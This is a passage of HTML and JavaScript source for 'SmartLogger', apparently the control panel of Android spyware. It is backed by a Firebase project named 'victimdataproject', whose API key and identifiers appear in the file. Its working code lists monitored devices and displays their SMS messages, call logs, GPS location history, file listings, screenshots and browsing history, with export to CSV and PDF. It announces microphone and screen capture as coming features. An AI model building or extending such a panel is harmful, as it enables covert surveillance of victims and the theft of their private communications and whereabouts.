<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SmartLogger Admin Panel</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <!-- Leaflet CSS (for Maps) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        :root {
            --dark-bg: #1e1e2d; /* Slightly purplish dark */
            --dark-surface: #27293d; /* Darker card background */
            --dark-card: #2c303a; /* Card background */
            --primary-text: #e0e0e0;
            --secondary-text: #a0a0b0;
            --accent-blue: #00a8cc;
            --accent-cyan: #4fc3f7;
            --neon-glow: #00fff2;
            --bs-body-color: var(--primary-text);
            --bs-body-bg: var(--dark-bg);
            --bs-emphasis-color: var(--accent-cyan);
            --bs-secondary-color: var(--secondary-text);
            --bs-tertiary-bg: var(--dark-card);
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--dark-bg);
            color: var(--primary-text);
            transition: background-color 0.3s, color 0.3s;
        }

        .navbar {
            background-color: var(--dark-surface);
            border-bottom: 1px solid var(--accent-blue);
        }
        .navbar-brand, .nav-link {
            color: var(--primary-text) !important;
        }
        .nav-link:hover {
            color: var(--accent-cyan) !important;
        }
        .nav-link .fas, .nav-link .far, .nav-link .fab {
            margin-right: 8px;
        }

        .btn-primary {
            background-color: var(--accent-blue);
            border-color: var(--accent-blue);
            color: #fff;
        }
        .btn-primary:hover {
            background-color: var(--accent-cyan);
            border-color: var(--accent-cyan);
        }
        .btn-outline-secondary {
            color: var(--secondary-text);
            border-color: var(--secondary-text);
        }
        .btn-outline-secondary:hover {
            color: var(--primary-text);
            background-color: var(--secondary-text);
            border-color: var(--secondary-text);
        }


        #login-page, #dashboard-page {
            min-height: 100vh;
        }

        .login-container {
            max-width: 400px;
            margin: auto;
            padding: 30px;
            background-color: var(--dark-card);
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 168, 204, 0.3);
        }
        .login-container h2 {
            color: var(--accent-cyan);
            text-align: center;
            margin-bottom: 20px;
        }

        .form-control {
            background-color: var(--dark-surface);
            color: var(--primary-text);
            border: 1px solid var(--accent-blue);
        }
        .form-control:focus {
            background-color: var(--dark-surface);
            color: var(--primary-text);
            border-color: var(--neon-glow);
            box-shadow: 0 0 0 0.25rem rgba(0, 255, 242, 0.25);
        }
        .form-label {
            color: var(--secondary-text);
        }

        .card {
            background-color: var(--dark-card);
            border: 1px solid var(--accent-blue);
            margin-bottom: 1.5rem;
        }
        .card-header {
            background-color: var(--dark-surface);
            color: var(--accent-cyan);
            border-bottom: 1px solid var(--accent-blue);
        }
        .card-title {
            color: var(--accent-cyan);
        }

        .table {
            color: var(--primary-text);
        }
        .table th {
            color: var(--accent-cyan);
            background-color: var(--dark-surface); /* Header background */
        }
        .table td {
            background-color: var(--dark-card); /* Cell background */
        }
        .table-hover > tbody > tr:hover > * {
            color: var(--primary-text);
            background-color: #3a3f51; /* Row hover color */
        }
        .status-online {
            color: #28a745; /* Green */
        }
        .status-offline {
            color: #dc3545; /* Red */
        }

        .nav-tabs .nav-link {
            color: var(--secondary-text);
            border: 1px solid transparent;
            border-top-left-radius: .25rem;
            border-top-right-radius: .25rem;
        }
        .nav-tabs .nav-link.active {
            color: var(--accent-cyan);
            background-color: var(--dark-bg);
            border-color: var(--accent-blue) var(--accent-blue) var(--dark-bg);
        }
        .tab-content {
            background-color: var(--dark-card);
            padding: 15px;
            border: 1px solid var(--accent-blue);
            border-top: none;
        }

        #gpsMap {
            height: 400px;
            border-radius: 5px;
        }
        .leaflet-popup-content-wrapper, .leaflet-popup-tip {
            background: var(--dark-surface);
            color: var(--primary-text);
        }

        .screenshot-item img {
            max-width: 100%;
            height: auto;
            border: 2px solid var(--accent-blue);
            border-radius: 4px;
            margin-bottom: 10px;
            cursor: pointer;
        }
        .screenshot-item img:hover {
            border-color: var(--neon-glow);
        }

        .file-explorer ul { list-style-type: none; padding-left: 20px; }
        .file-explorer li { margin-bottom: 5px; }
        .file-explorer .folder-icon { color: var(--accent-cyan); margin-right: 5px; }
        .file-explorer .file-icon { color: var(--secondary-text); margin-right: 5px; }

        .loading-spinner {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100px;
            color: var(--accent-cyan);
        }

        .empty-state {
            text-align: center;
            padding: 20px;
            color: var(--secondary-text);
        }
        .empty-state i {
            font-size: 3rem;
            margin-bottom: 10px;
            color: var(--accent-blue);
        }

        /* Animations and Transitions */
        .fade-in {
            animation: fadeInAnimation 0.5s ease-in-out;
        }
        @keyframes fadeInAnimation {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .navbar-nav { margin-top: 10px; }
            .device-details-header { flex-direction: column; align-items: flex-start !important; }
            .device-details-header h3 { margin-bottom: 10px; }
        }
    </style>
</head>
<body>

    <!-- Login Page -->
    <div id="login-page" class="d-flex align-items-center justify-content-center">
        <div class="login-container">
            <h2><i class="fas fa-shield-alt"></i> Admin Panel Login</h2>
            <form id="login-form">
                <div class="mb-3">
                    <label for="email" class="form-label">Email address</label>
                    <input type="email" class="form-control" id="email" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <div id="login-error" class="text-danger mt-2"></div>
            </form>
        </div>
    </div>

    <!-- Dashboard Page -->
    <div id="dashboard-page" style="display: none;">
        <nav class="navbar navbar-expand-lg sticky-top">
            <div class="container-fluid">
                <a class="navbar-brand" href="#"><i class="fas fa-user-secret"></i> SmartLogger Dashboard</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon" style="background-image: url(\"data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba(0, 168, 204, 0.8)' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e\");"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav ms-auto">
                        <li class="nav-item">
                            <a class="nav-link active" id="nav-devices-list" href="#"><i class="fas fa-mobile-alt"></i> Devices</a>
                        </li>
                        <li class="nav-item">
                            <span class="nav-link" id="user-email-display"></span>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="#" id="logout-button"><i class="fas fa-sign-out-alt"></i> Logout</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>

        <div class="container-fluid mt-4">
            <!-- Device List View -->
            <div id="device-list-view" class="fade-in">
                <div class="card">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <span><i class="fas fa-list-ul"></i> Connected Devices</span>
                        <div class="d-flex">
                            <input type="text" id="search-device" class="form-control form-control-sm me-2" placeholder="Search...">
                            <select id="filter-status" class="form-select form-select-sm me-2" style="width: 150px;">
                                <option value="all">All Status</option>
                                <option value="online">Online</option>
                                <option value="offline">Offline</option>
                            </select>
                            <select id="sort-devices" class="form-select form-select-sm" style="width: 180px;">
                                <option value="lastSeen_desc">Sort by Last Seen (Newest)</option>
                                <option value="lastSeen_asc">Sort by Last Seen (Oldest)</option>
                                <option value="aliasName_asc">Sort by Name (A-Z)</option>
                                <option value="aliasName_desc">Sort by Name (Z-A)</option>
                            </select>
                        </div>
                    </div>
                    <div class="card-body">
                        <div class="table-responsive">
                            <table class="table table-hover">
                                <thead>
                                    <tr>
                                        <th>Alias Name</th>
                                        <th>Device UID</th>
                                        <th>Status</th>
                                        <th>Last Seen</th>
                                        <th>Total Logs</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="device-list-table-body">
                                    <!-- Device rows will be injected here -->
                                </tbody>
                            </table>
                        </div>
                        <div id="device-list-empty" class="empty-state" style="display: none;">
                            <i class="fas fa-mobile-slash"></i>
                            <p>No devices found or connected yet.</p>
                        </div>
                        <div id="device-list-loading" class="loading-spinner">
                            <div class="spinner-border" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Device Details View -->
            <div id="device-details-view" style="display: none;" class="fade-in">
                <div class="d-flex justify-content-between align-items-center mb-3 device-details-header">
                    <h3 id="device-details-title">Device Details</h3>
                    <button class="btn btn-sm btn-outline-secondary" id="back-to-list-button"><i class="fas fa-arrow-left"></i> Back to Device List</button>
                </div>

                <ul class="nav nav-tabs" id="deviceDetailsTab" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="info-tab" data-bs-toggle="tab" data-bs-target="#info-content" type="button" role="tab"><i class="fas fa-info-circle"></i> Info</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="sms-tab" data-bs-toggle="tab" data-bs-target="#sms-content" type="button" role="tab"><i class="fas fa-sms"></i> SMS</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="calls-tab" data-bs-toggle="tab" data-bs-target="#calls-content" type="button" role="tab"><i class="fas fa-phone-alt"></i> Calls</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="apps-tab" data-bs-toggle="tab" data-bs-target="#apps-content" type="button" role="tab"><i class="fas fa-th-large"></i> Apps</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="battery-tab" data-bs-toggle="tab" data-bs-target="#battery-content" type="button" role="tab"><i class="fas fa-battery-half"></i> Battery</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="gps-tab" data-bs-toggle="tab" data-bs-target="#gps-content" type="button" role="tab"><i class="fas fa-map-marker-alt"></i> GPS</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files-content" type="button" role="tab"><i class="fas fa-folder-open"></i> Files</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="screenshots-tab" data-bs-toggle="tab" data-bs-target="#screenshots-content" type="button" role="tab"><i class="fas fa-camera"></i> Screenshots</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="browsing-tab" data-bs-toggle="tab" data-bs-target="#browsing-content" type="button" role="tab"><i class="fas fa-globe"></i> Browsing</button>
                    </li>
                    <!-- Expandability Placeholders -->
                    <li class="nav-item" role="presentation"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#mic-content" type="button" role="tab"><i class="fas fa-microphone"></i> Mic (Soon)</button></li>
                    <li class="nav-item" role="presentation"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#screen-content" type="button" role="tab"><i class="fas fa-desktop"></i> Screen (Soon)</button></li>
                </ul>

                <div class="tab-content" id="deviceDetailsTabContent">
                    <div class="tab-pane fade-in show active" id="info-content" role="tabpanel">
                        <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="info" data-format="csv">Export CSV</button>
                        <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="info" data-format="pdf">Export PDF</button>
                        <h4>Device Information</h4>
                        <div id="info-data" class="pt-2"></div>
                    </div>
                    <div class="tab-pane fade-in" id="sms-content" role="tabpanel">
                        <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="sms" data-format="csv">Export CSV</button>
                        <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="sms" data-format="pdf">Export PDF</button>
                        <h4>SMS Logs</h4>
                        <div id="sms-data" class="table-responsive pt-2"></div>
                    </div>
                    <div class="tab-pane fade-in" id="calls-content" role="tabpanel">
                        <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="calls" data-format="csv">Export CSV</button>
                        <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="calls" data-format="pdf">Export PDF</button>
                        <h4>Call Logs</h4>
                        <div id="calls-data" class="table-responsive pt-2"></div>
                    </div>
                    <div class="tab-pane fade-in" id="apps-content" role="tabpanel">
                         <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="apps" data-format="csv">Export CSV</button>
                         <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="apps" data-format="pdf">Export PDF</button>
                        <h4>Installed Applications</h4>
                        <div id="apps-data" class="table-responsive pt-2"></div>
                    </div>
                    <div class="tab-pane fade-in" id="battery-content" role="tabpanel">
                        <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="battery" data-format="csv">Export CSV</button>
                        <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="battery" data-format="pdf">Export PDF</button>
                        <h4>Battery Information</h4>
                        <div id="battery-data" class="pt-2"></div>
                    </div>
                    <div class="tab-pane fade-in" id="gps-content" role="tabpanel">
                        <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="gps" data-format="csv">Export CSV</button>
                        <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="gps" data-format="pdf">Export PDF</button>
                        <h4>GPS Location History</h4>
                        <div id="gps-map-container" class="pt-2">
                            <div id="gpsMap" style="height: 450px; width: 100%;"></div>
                            <div id="gps-data-list" class="mt-3 table-responsive"></div>
                        </div>
                    </div>
                    <div class="tab-pane fade-in" id="files-content" role="tabpanel">
                        <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="files" data-format="csv">Export CSV</button>
                        <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="files" data-format="pdf">Export PDF</button>
                        <h4>File Explorer Logs</h4>
                        <div id="files-data" class="file-explorer pt-2"></div>
                    </div>
                    <div class="tab-pane fade-in" id="screenshots-content" role="tabpanel">
                        <h4>Screenshots</h4>
                        <div id="screenshots-data" class="row pt-2"></div>
                    </div>
                    <div class="tab-pane fade-in" id="browsing-content" role="tabpanel">
                        <button class="btn btn-sm btn-outline-info float-end export-btn" data-type="browsing" data-format="csv">Export CSV</button>
                        <button class="btn btn-sm btn-outline-info float-end me-2 export-btn" data-type="browsing" data-format="pdf">Export PDF</button>
                        <h4>Browsing History</h4>
                        <div id="browsing-data" class="table-responsive pt-2"></div>
                    </div>
                    <!-- Placeholder Content -->
                    <div class="tab-pane fade-in" id="mic-content" role="tabpanel"><div class="empty-state"><i class="fas fa-microphone-slash"></i><p>Microphone Recorder feature coming soon.</p></div></div>
                    <div class="tab-pane fade-in" id="screen-content" role="tabpanel"><div class="empty-state"><i class="fas fa-tv"></i><p>Screen Capture feature coming soon.</p></div></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS Bundle (Popper.js included) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Firebase SDKs (using v9 modular syntax) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
        import { getStorage, ref as storageRef, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js";

        // Firebase Project Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw", // Replace with your actual API key
            authDomain: "victimdataproject.firebaseapp.com", // Your project's auth domain
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/", // Your project's RTDB URL
            projectId: "victimdataproject", // Your project ID
            storageBucket: "victimdataproject.appspot.com", // Your project's storage bucket (usually .appspot.com)
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc" // Your Web App ID
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const database = getDatabase(app);
        const storage = getStorage(app);

        // Leaflet.js (for map) - loaded dynamically to ensure it's available after DOM
        let L; // Leaflet instance
        async function loadLeaflet() {
            if (!L) {
                const leafletScript = document.createElement('script');
                leafletScript.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
                document.head.appendChild(leafletScript);
                await new Promise(resolve => leafletScript.onload = resolve);
                L = window.L; // Assign to global L used by Leaflet
            }
        }
        
        // jsPDF and jsPDF-AutoTable - loaded dynamically
        let jsPDFModule, autoTableModule;
        async function loadJsPDF() {
            if (!jsPDFModule) {
                const jsPDFScript = document.createElement('script');
                jsPDFScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
                document.head.appendChild(jsPDFScript);
                await new Promise(resolve => jsPDFScript.onload = resolve);
                jsPDFModule = window.jspdf;
            }
            if (!autoTableModule && jsPDFModule) {
                 const autoTableScript = document.createElement('script');
                 autoTableScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.1/jspdf.plugin.autotable.min.js';
                 document.head.appendChild(autoTableScript);
                 await new Promise(resolve => autoTableScript.onload = resolve);
                 autoTableModule = window.jspdf.autoTable; // autoTable is a plugin on jspdf instance
            }
        }


        // DOM Elements
        const loginPage = document.getElementById('login-page');
        const dashboardPage = document.getElementById('dashboard-page');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const logoutButton = document.getElementById('logout-button');
        const userEmailDisplay = document.getElementById('user-email-display');
        
        const deviceListView = document.getElementById('device-list-view');
        const deviceDetailsView = document.getElementById('device-details-view');
        const deviceListTableBody = document.getElementById('device-list-table-body');
        const deviceListEmpty = document.getElementById('device-list-empty');
        const deviceListLoading = document.getElementById('device-list-loading');

        const searchDeviceInput = document.getElementById('search-device');
        const filterStatusSelect = document.getElementById('filter-status');
        const sortDevicesSelect = document.getElementById('sort-devices');

        const backToListButton = document.getElementById('back-to-list-button');
        const deviceDetailsTitle = document.getElementById('device-details-title');

        // Data display areas
        const infoDataEl = document.getElementById('info-data');
        const smsDataEl = document.getElementById('sms-data');
        const callsDataEl = document.getElementById('calls-data');
        const appsDataEl = document.getElementById('apps-data');
        const batteryDataEl = document.getElementById('battery-data');
        const gpsMapContainerEl = document.getElementById('gps-map-container');
        const gpsMapEl = document.getElementById('gpsMap');
        const gpsDataListEl = document.getElementById('gps-data-list');
        const filesDataEl = document.getElementById('files-data');
        const screenshotsDataEl = document.getElementById('screenshots-data');
        const browsingDataEl = document.getElementById('browsing-data');

        let currentDeviceUID = null;
        let deviceDataListeners = []; // To keep track of active listeners for cleanup
        let devicesCache = {}; // Cache for device list data for filtering/sorting
        let mapInstance = null; // Leaflet map instance

        // --- Authentication ---
        onAuthStateChanged(auth, (user) => {
            if (user) {
                loginPage.style.display = 'none';
                dashboardPage.style.display = 'block';
                userEmailDisplay.textContent = user.email;
                loadDeviceList();
                document.getElementById('nav-devices-list').addEventListener('click', (e) => {
                    e.preventDefault();
                    showDeviceListView();
                });
            } else {
                loginPage.style.display = 'flex';
                dashboardPage.style.display = 'none';
                userEmailDisplay.textContent = '';
                cleanupDeviceDataListeners();
                if (mapInstance) {
                    mapInstance.remove();
                    mapInstance = null;
                }
            }
        });

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = loginForm.email.value;
            const password = loginForm.password.value;
            signInWithEmailAndPassword(auth, email, password)
                .then((userCredential) => {
                    loginError.textContent = '';
                })
                .catch((error) => {
                    loginError.textContent = error.message;
                    console.error("Login error:", error);
                });
        });

        logoutButton.addEventListener('click', (e) => {
            e.preventDefault();
            firebaseSignOut(auth).catch(error => console.error("Logout error:", error));
        });

        // --- Utility Functions ---
        function formatTimestamp(timestamp) {
            if (!timestamp) return 'N/A';
            // Check if timestamp is in seconds or milliseconds
            const date = new Date(timestamp > 99999999999 ? timestamp : timestamp * 1000);
            return date.toLocaleString();
        }

        function createEmptyState(message, iconClass = 'fas fa-box-open') {
            return `<div class="empty-state fade-in"><i class="${iconClass}"></i><p>${message}</p></div>`;
        }
        
        function createLoadingSpinner() {
            return `<div class="loading-spinner"><div class="spinner-border" role="status"><span class="visually-hidden">Loading...</span></div></div>`;
        }

        // --- Device List ---
        function loadDeviceList() {
            deviceListLoading.style.display = 'flex';
            deviceListTableBody.innerHTML = '';
            deviceListEmpty.style.display = 'none';

            const devicesRef = ref(database, 'devices');
            onValue(devicesRef, (snapshot) => {
                devicesCache = snapshot.val() || {};
                renderDeviceList();
                deviceListLoading.style.display = 'none';
                if (Object.keys(devicesCache).length === 0) {
                    deviceListEmpty.style.display = 'block';
                } else {
                    deviceListEmpty.style.display = 'none';
                }
            }, (error) => {
                console.error("Error loading device list:", error);
                deviceListLoading.style.display = 'none';
                deviceListTableBody.innerHTML = `<tr><td colspan="6" class="text-danger text-center">Error loading devices: ${error.message}</td></tr>`;
            });
        }
        
        function renderDeviceList() {
            deviceListTableBody.innerHTML = '';
            let devicesArray = Object.entries(devicesCache).map(([uid, data]) => ({ uid, ...data }));

            // Filtering
            const searchTerm = searchDeviceInput.value.toLowerCase();
            const statusFilter = filterStatusSelect.value;

            if (searchTerm) {
                devicesArray = devicesArray.filter(device => 
                    (device.aliasName && device.aliasName.toLowerCase().includes(searchTerm)) ||
                    device.uid.toLowerCase().includes(searchTerm)
                );
            }
            if (statusFilter !== 'all') {
                devicesArray = devicesArray.filter(device => 
                    (statusFilter === 'online' && device.onlineStatus) ||
                    (statusFilter === 'offline' && !device.onlineStatus)
                );
            }

            // Sorting
            const sortOption = sortDevicesSelect.value;
            devicesArray.sort((a, b) => {
                switch (sortOption) {
                    case 'lastSeen_asc': return (a.lastSeen || 0) - (b.lastSeen || 0);
                    case 'aliasName_asc': return (a.aliasName || '').localeCompare(b.aliasName || '');
                    case 'aliasName_desc': return (b.aliasName || '').localeCompare(a.aliasName || '');
                    default: /* lastSeen_desc */ return (b.lastSeen || 0) - (a.lastSeen || 0);
                }
            });

            if (devicesArray.length === 0) {
                deviceListEmpty.style.display = 'block';
                return;
            }
            deviceListEmpty.style.display = 'none';

            devicesArray.forEach(device => {
                const totalLogs = countDeviceLogs(device);
                const row = `
                    <tr class="fade-in">
                        <td>${device.aliasName || 'N/A'}</td>
                        <td>${device.uid}</td>
                        <td>
                            <span class="${device.onlineStatus ? 'status-online' : 'status-offline'}">
                                <i class="fas fa-circle"></i> ${device.onlineStatus ? 'Online' : 'Offline'}
                            </span>
                        </td>
                        <td>${formatTimestamp(device.lastSeen)}</td>
                        <td>${totalLogs}</td>
                        <td>
                            <button class="btn btn-sm btn-primary view-device-btn" data-uid="${device.uid}">
                                <i class="fas fa-eye"></i> View
                            </button>
                        </td>
                    </tr>
                `;
                deviceListTableBody.innerHTML += row;
            });

            document.querySelectorAll('.view-device-btn').forEach(btn => {
                btn.addEventListener('click', () => showDeviceDetailsView(btn.dataset.uid));
            });
        }

        searchDeviceInput.addEventListener('input', renderDeviceList);
        filterStatusSelect.addEventListener('change', renderDeviceList);
        sortDevicesSelect.addEventListener('change', renderDeviceList);

        function countDeviceLogs(deviceData) {
            let count = 0;
            if (deviceData.smsLogs) count += Object.keys(deviceData.smsLogs).length;
            if (deviceData.callLogs) count += Object.keys(deviceData.callLogs).length;
            if (deviceData.installedApps) count += Object.keys(deviceData.installedApps).length;
            if (deviceData.gpsLocation) count += Object.keys(deviceData.gpsLocation).length;
            if (deviceData.screenshots) count += Object.keys(deviceData.screenshots).length;
            if (deviceData.browsingHistory) count += Object.keys(deviceData.browsingHistory).length;
            // File explorer logs are trickier to count simply, can be nested.
            // For now, just counting top-level folders/files if structured that way.
            if (deviceData.fileExplorer) count += Object.keys(deviceData.fileExplorer).length;
            return count;
        }

        // --- Device Details View ---
        function showDeviceListView() {
            deviceListView.style.display = 'block';
            deviceDetailsView.style.display = 'none';
            cleanupDeviceDataListeners();
            currentDeviceUID = null;
            if (mapInstance) {
                mapInstance.remove();
                mapInstance = null;
            }
            // Ensure tabs are reset
             const firstTab = new bootstrap.Tab(document.getElementById('info-tab'));
             firstTab.show();
        }

        function showDeviceDetailsView(uid) {
            currentDeviceUID = uid;
            deviceListView.style.display = 'none';
            deviceDetailsView.style.display = 'block';
            
            const device = devicesCache[uid];
            deviceDetailsTitle.textContent = `Details for ${device?.aliasName || uid}`;

            // Reset tab content
            const tabContents = document.querySelectorAll('#deviceDetailsTabContent .tab-pane > div:not(#gpsMap)');
            tabContents.forEach(el => el.innerHTML = createLoadingSpinner());
            if (document.getElementById('gpsMap')) document.getElementById('gpsMap').innerHTML = '';
            if (document.getElementById('gps-data-list')) document.getElementById('gps-data-list').innerHTML = '';


            // Load data for each tab
            loadDeviceInfo(uid);
            loadSmsLogs(uid);
            loadCallLogs(uid);
            loadInstalledApps(uid);
            loadBatteryInfo(uid);
            loadGpsLocation(uid);
            loadFileSystemLogs(uid);
            loadScreenshots(uid);
            loadBrowsingHistory(uid);
        }

        backToListButton.addEventListener('click', showDeviceListView);

        function cleanupDeviceDataListeners() {
            deviceDataListeners.forEach(({ path, listener }) => {
                off(ref(database, path), 'value', listener);
            });
            deviceDataListeners = [];
        }

        function addDeviceDataListener(path, callback) {
            const fullPath = `devices/${currentDeviceUID}/${path}`;
            const listener = onValue(ref(database, fullPath), callback, (error) => {
                console.error(`Error loading ${path}:`, error);
                const targetEl = document.getElementById(`${path.split('/')[0]}-data`); // e.g. sms-data
                if (targetEl) targetEl.innerHTML = createEmptyState(`Error loading data: ${error.message}`, 'fas fa-exclamation-triangle');
            });
            deviceDataListeners.push({ path: fullPath, listener });
        }
        
        // --- Specific Data Loaders ---
        function loadDeviceInfo(uid) {
            addDeviceDataListener('deviceInfo', (snapshot) => {
                const data = snapshot.val();
                let html = '';
                if (data) {
                    html = `
                        <table class="table table-sm" id="info-table-export">
                            <tbody>
                                <tr><th>Model</th><td>${data.model || 'N/A'}</td></tr>
                                <tr><th>Android Version</th><td>${data.androidVersion || 'N/A'}</td></tr>
                                <tr><th>IP Address</th><td>${data.ipAddress || 'N/A'}</td></tr>
                                <!-- Add other device info fields as available -->
                            </tbody>
                        </table>`;
                } else {
                    html = createEmptyState('No device information available.');
                }
                infoDataEl.innerHTML = html;
            });
        }

        function loadSmsLogs(uid) {
            addDeviceDataListener('smsLogs', (snapshot) => {
                const logs = snapshot.val();
                let html = '';
                if (logs && Object.keys(logs).length > 0) {
                    html = '<table class="table table-sm table-striped" id="sms-table-export"><thead><tr><th>Type</th><th>Sender/Receiver</th><th>Message</th><th>Time</th></tr></thead><tbody>';
                    Object.values(logs).sort((a,b) => (b.time || 0) - (a.time || 0)).forEach(log => {
                        html += `<tr>
                                    <td><span class="badge bg-${log.type === 'inbox' ? 'success' : 'primary'}">${log.type || 'N/A'}</span></td>
                                    <td>${log.sender || 'N/A'}</td>
                                    <td>${log.message || 'N/A'}</td>
                                    <td>${formatTimestamp(log.time)}</td>
                                 </tr>`;
                    });
                    html += '</tbody></table>';
                } else {
                    html = createEmptyState('No SMS logs available.', 'fas fa-comment-slash');
                }
                smsDataEl.innerHTML = html;
            });
        }
        
        function loadCallLogs(uid) {
            addDeviceDataListener('callLogs', (snapshot) => {
                const logs = snapshot.val();
                let html = '';
                if (logs && Object.keys(logs).length > 0) {
                    html = '<table class="table table-sm table-striped" id="calls-table-export"><thead><tr><th>Type</th><th>Number</th><th>Duration (s)</th><th>Time</th></tr></thead><tbody>';
                    Object.values(logs).sort((a,b) => (b.time || 0) - (a.time || 0)).forEach(log => {
                        let icon = 'fa-phone';
                        if (log.type === 'incoming') icon = 'fa-phone-arrow-down-left';
                        else if (log.type === 'outgoing') icon = 'fa-phone-arrow-up-right';
                        else if (log.type === 'missed') icon = 'fa-phone-missed';
                        html += `<tr>
                                    <td><i class="fas ${icon}"></i> ${log.type || 'N/A'}</td>
                                    <td>${log.number || 'N/A'}</td>
                                    <td>${log.duration || '0'}s</td>
                                    <td>${formatTimestamp(log.time)}</td>
                                 </tr>`;
                    });
                    html += '</tbody></table>';
                } else {
                    html = createEmptyState('No call logs available.', 'fas fa-phone-slash');
                }
                callsDataEl.innerHTML = html;
            });
        }

        function loadInstalledApps(uid) {
             addDeviceDataListener('installedApps', (snapshot) => {
                const apps = snapshot.val();
                let html = '';
                if (apps && Object.keys(apps).length > 0) {
                    html = '<table class="table table-sm table-striped" id="apps-table-export"><thead><tr><th>App Name</th><th>Package Name</th></tr></thead><tbody>';
                    Object.values(apps).forEach(app => {
                         html += `<tr>
                                     <td>${app.appName || 'N/A'}</td>
                                     <td>${app.packageName || 'N/A'}</td>
                                  </tr>`;
                    });
                    html += '</tbody></table>';
                } else {
                    html = createEmptyState('No installed apps data available.', 'fas fa-grip-horizontal');
                }
                appsDataEl.innerHTML = html;
            });
        }
        
        function loadBatteryInfo(uid) {
            addDeviceDataListener('batteryInfo', (snapshot) => {
                const data = snapshot.val();
                let html = '';
                if (data) {
                    const batteryIcon = data.isCharging ? 'fa-battery-bolt' : 
                                       data.level > 80 ? 'fa-battery-full' :
                                       data.level > 50 ? 'fa-battery-three-quarters' :
                                       data.level > 20 ? 'fa-battery-half' : 'fa-battery-quarter';
                    html = `
                        <table class="table table-sm" id="battery-table-export">
                            <tbody>
                                <tr><th>Level</th><td><i class="fas ${batteryIcon}"></i> ${data.level || 'N/A'}%</td></tr>
                                <tr><th>Charging Status</th><td>${data.isCharging ? 'Charging' : 'Not Charging'}</td></tr>
                                <tr><th>Last Update</th><td>${formatTimestamp(data.timestamp)}</td></tr>
